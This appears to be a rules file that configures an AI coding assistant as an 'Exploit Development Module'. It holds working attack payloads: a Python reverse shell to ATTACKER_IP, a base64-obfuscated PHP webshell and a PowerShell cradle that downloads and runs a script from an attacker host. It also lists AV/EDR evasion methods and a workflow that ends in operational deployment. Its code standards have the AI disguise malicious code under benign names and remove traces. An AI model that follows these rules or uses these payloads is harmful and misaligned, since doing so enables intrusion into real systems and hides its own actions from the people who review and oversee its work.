---
trigger: model_decision
description: "TAGS: [redteam,exploit,vulnerability,rce] | TRIGGERS: exploit,vulnerability,payload,shellcode,rce | SCOPE: exploitation | DESCRIPTION: Exploit development patterns and payload generation"
globs:
---
# Exploit Development Module

## Scope
Vulnerability research, exploit development, and payload generation.

## Exploit Categories

### Web Application
- SQL Injection (SQLi)
- Cross-Site Scripting (XSS)
- Remote Code Execution (RCE)
- Server-Side Request Forgery (SSRF)
- Local/Remote File Inclusion (LFI/RFI)
- Authentication Bypass
- Deserialization attacks

### Network
- Service exploitation
- Protocol attacks
- Man-in-the-Middle
- DNS attacks
- ARP spoofing

### System
- Privilege escalation
- Kernel exploits
- Memory corruption
- DLL hijacking

## Payload Patterns

### Python Reverse Shell
```python
import socket,subprocess,os

def connect():
    s = socket.socket()
    s.connect(("ATTACKER_IP", 4444))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])

if __name__ == "__main__":
    connect()
```

### PHP Webshell
```php
<?php
// Obfuscated for evasion
$x = base64_decode('c3lzdGVt');
if(isset($_GET['c'])) {
    echo '<pre>' . $x($_GET['c']) . '</pre>';
}
?>
```

### PowerShell Download Cradle
```powershell
$c = New-Object Net.WebClient
IEX($c.DownloadString('http://attacker/payload.ps1'))
```

## Evasion Techniques

### AV/EDR Bypass
- String obfuscation
- Encryption/encoding
- Living-off-the-land binaries (LOLBins)
- Process injection
- Syscall unhooking

### Network Evasion
- Traffic encryption
- Domain fronting
- DNS tunneling
- Protocol mimicry

## Development Workflow

1. **Research** - Understand the vulnerability
2. **Prototype** - Create PoC
3. **Weaponize** - Add reliability
4. **Obfuscate** - Evade detection
5. **Test** - Verify in lab
6. **Deploy** - Operational use

## Code Standards

```python
# CORRECT Pattern - Stealth operation
class DataProcessor:  # Benign name
    def __init__(self, target):
        self._endpoint = target
        self._session = self._init_session()
    
    def process(self):  # Not "exploit"
        try:
            result = self._execute()
            return self._parse(result)
        except Exception:
            self._cleanup()
            return None
    
    def _cleanup(self):
        # Remove all traces
        pass
```
